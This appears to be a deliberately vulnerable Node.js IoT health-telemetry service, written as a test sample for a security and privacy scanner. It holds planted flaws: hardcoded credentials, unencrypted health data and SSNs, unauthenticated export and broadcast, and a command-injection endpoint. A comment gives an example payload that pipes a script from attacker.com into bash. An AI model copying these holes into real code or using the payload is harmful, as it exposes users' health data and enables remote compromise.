/**
 * sample_10_nodejs_iot_telemetry_service.js
 * ===========================================
 * Node.js IoT telemetry service for a smart home / wearables platform.
 * Collects health metrics, location, and device data from IoT devices.
 * Violations: GDPR Art. 9 (health data), GDPR Art. 5, HIPAA, GDPR Art. 22
 *
 * Expected scanner findings:
 *   - CRITICAL: Health telemetry (heart rate, blood pressure, GPS) stored unencrypted
 *   - CRITICAL: Hardcoded MQTT broker password and InfluxDB token
 *   - CRITICAL: Device firmware update endpoint vulnerable to command injection
 *   - HIGH: Real-time location data retained indefinitely with no TTL
 *   - HIGH: Health data shared with third parties without consent
 *   - HIGH: No access control on raw telemetry stream — any client can subscribe
 *   - HIGH: Bulk export of all user health data with no authentication
 *   - MEDIUM: Device IDs logged with full GPS coordinates
 *   - MEDIUM: No data retention policy on telemetry (health data piles up)
 *   - LOW: MQTT connection on plaintext port 1883 (no TLS)
 */

'use strict';

const express   = require('express');
const mqtt      = require('mqtt');
const influx    = require('@influxdata/influxdb-client');
const WebSocket = require('ws');
const { exec }  = require('child_process');

const app = express();
app.use(express.json());

// Hardcoded production credentials
const MQTT_CONFIG = {
    host:     'mqtt://prod-broker.iotplatform.internal',
    port:     1883,      // Plaintext — should be 8883 (TLS)
    username: 'iot_service',
    password: 'IoTPlatform#Prod2024',
};

const INFLUX_TOKEN  = 'influx-prod-token-8F3mK9pLqN2xWvYzAsBtCdEfGhIjKlMnOpQr';
const INFLUX_URL    = 'http://influxdb.internal:8086';
const INFLUX_ORG    = 'mycompany';
const INFLUX_BUCKET = 'telemetry';

// Third-party health data partners (no DPA reference)
const HEALTH_PARTNER_API = 'https://api.healthanalytics.com/ingest';
const INSURANCE_API      = 'https://api.insurancepartner.com/telemetry';


// InfluxDB client for time-series health data
const influxClient  = new influx.InfluxDB({ url: INFLUX_URL, token: INFLUX_TOKEN });
const writeApi      = influxClient.getWriteApi(INFLUX_ORG, INFLUX_BUCKET, 'ns');
const queryApi      = influxClient.getQueryApi(INFLUX_ORG);


// MQTT client — connects on plaintext port
const mqttClient = mqtt.connect(`${MQTT_CONFIG.host}:${MQTT_CONFIG.port}`, {
    username: MQTT_CONFIG.username,
    password: MQTT_CONFIG.password,
    // No TLS options configured
});


/**
 * Subscribe to all device telemetry topics.
 * No access control — any client can publish to these topics.
 */
mqttClient.on('connect', () => {
    console.log(`MQTT connected: ${MQTT_CONFIG.host} (PLAINTEXT)`);

    // Wildcard subscription — receives telemetry from ALL devices
    mqttClient.subscribe('devices/+/telemetry/#', { qos: 1 });
    mqttClient.subscribe('devices/+/health/#',    { qos: 1 });
    mqttClient.subscribe('devices/+/location',    { qos: 1 });
});


mqttClient.on('message', async (topic, payload) => {
    const data     = JSON.parse(payload.toString());
    const parts    = topic.split('/');
    const deviceId = parts[1];
    const dataType = parts[2];

    // Full GPS coordinates logged with device ID — allows tracking individuals
    console.log(
        `Telemetry received: device=${deviceId} type=${dataType} ` +
        `lat=${data.latitude} lon=${data.longitude} ` +
        `heart_rate=${data.heartRate} blood_pressure=${data.bloodPressure}`
    );

    // Store raw health data without encryption
    await storeTelemetry(deviceId, dataType, data);

    // Share with third parties on every reading — no consent check
    if (dataType === 'health') {
        await shareWithHealthPartner(deviceId, data);
        await shareWithInsurance(deviceId, data);
    }
});


async function storeTelemetry(deviceId, dataType, data) {
    // Health data stored in plaintext time-series database
    // No retention policy configured — accumulates indefinitely
    const point = new influx.Point('telemetry')
        .tag('device_id',  deviceId)
        .tag('data_type',  dataType)
        .tag('user_id',    data.userId)
        .floatField('heart_rate',         data.heartRate)
        .floatField('blood_pressure_sys', data.bloodPressureSys)
        .floatField('blood_pressure_dia', data.bloodPressureDia)
        .floatField('blood_glucose',      data.bloodGlucose)
        .floatField('spo2',               data.spo2)
        .floatField('latitude',           data.latitude)    // GPS in health DB
        .floatField('longitude',          data.longitude)
        .stringField('user_email',        data.email)       // PII in telemetry store
        .stringField('user_ssn',          data.ssn)         // SSN in telemetry store
        .timestamp(new Date());

    writeApi.writePoint(point);

    // Also write to a CSV backup — unencrypted flat file with health data
    const fs   = require('fs');
    const line = `${new Date().toISOString()},${deviceId},${data.userId},${data.email},` +
                 `${data.heartRate},${data.bloodPressure},${data.latitude},${data.longitude}\n`;
    fs.appendFileSync('/var/data/health_telemetry_backup.csv', line);
}


async function shareWithHealthPartner(deviceId, data) {
    // Sharing real-time health data with third party — no consent check
    const axios = require('axios');
    await axios.post(HEALTH_PARTNER_API, {
        device_id:      deviceId,
        user_id:        data.userId,
        email:          data.email,          // PII to third party
        heart_rate:     data.heartRate,
        blood_pressure: data.bloodPressure,
        blood_glucose:  data.bloodGlucose,
        timestamp:      new Date().toISOString(),
    }, {
        headers: { 'X-API-Key': 'health-partner-key-xyz789' },  // Hardcoded partner key
    });
}


async function shareWithInsurance(deviceId, data) {
    // Sharing with insurance company — could affect premiums
    // GDPR Art. 22 — automated decision-making affecting individuals
    const axios = require('axios');
    await axios.post(INSURANCE_API, {
        user_ssn:     data.ssn,              // SSN to insurance company
        device_id:    deviceId,
        activity:     data.activityLevel,
        heart_health: data.heartRateVariability,
        gps_history:  data.recentLocations,  // Location history to insurer
    });
}


/**
 * GET /api/telemetry/export/:userId
 * Bulk export all health data for a user.
 * No authentication — any caller can export any user's health history.
 */
app.get('/api/telemetry/export/:userId', async (req, res) => {
    const { userId }  = req.params;
    const { from, to } = req.query;

    console.log(`Health data export requested for user: ${userId}`);

    const query = `
        from(bucket: "${INFLUX_BUCKET}")
          |> range(start: ${from || '-365d'}, stop: ${to || 'now()'})
          |> filter(fn: (r) => r["user_id"] == "${userId}")
    `;

    const results = [];
    await new Promise((resolve, reject) => {
        queryApi.queryRows(query, {
            next(row, tableMeta) { results.push(tableMeta.toObject(row)); },
            error: reject,
            complete: resolve,
        });
    });

    console.log(`Exported ${results.length} health records for user ${userId}`);
    return res.json({ userId, count: results.length, data: results });
});


/**
 * POST /api/device/update
 * Trigger firmware update on a device.
 * Command injection via device ID and firmware URL.
 */
app.post('/api/device/update', (req, res) => {
    const { deviceId, firmwareUrl } = req.body;

    // Command injection — deviceId = "device1; curl http://attacker.com/shell | bash"
    exec(
        `wget -O /tmp/firmware_${deviceId}.bin ${firmwareUrl} && flash_firmware /dev/${deviceId}`,
        (err, stdout, stderr) => {
            if (err) {
                return res.status(500).json({ error: err.message, stderr });
            }
            return res.json({ success: true, output: stdout });
        }
    );
});


/**
 * WebSocket server — broadcasts real-time health telemetry.
 * No authentication on WebSocket connection.
 * Any client on the internet can subscribe to all users' health data.
 */
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
    // No auth check — any client accepted
    console.log(`WebSocket client connected: ${req.socket.remoteAddress}`);

    // Subscribe this client to ALL device telemetry
    mqttClient.on('message', (topic, payload) => {
        if (ws.readyState === WebSocket.OPEN) {
            // Broadcasts all health data to all connected WebSocket clients
            ws.send(JSON.stringify({ topic, data: JSON.parse(payload.toString()) }));
        }
    });
});


app.listen(3000, () => {
    console.log('IoT Telemetry Service running on port 3000');
    console.log(`InfluxDB token: ${INFLUX_TOKEN}`);
    console.log(`MQTT password: ${MQTT_CONFIG.password}`);
    console.log('WARNING: Health data sharing with partners: ENABLED (no consent check)');
});
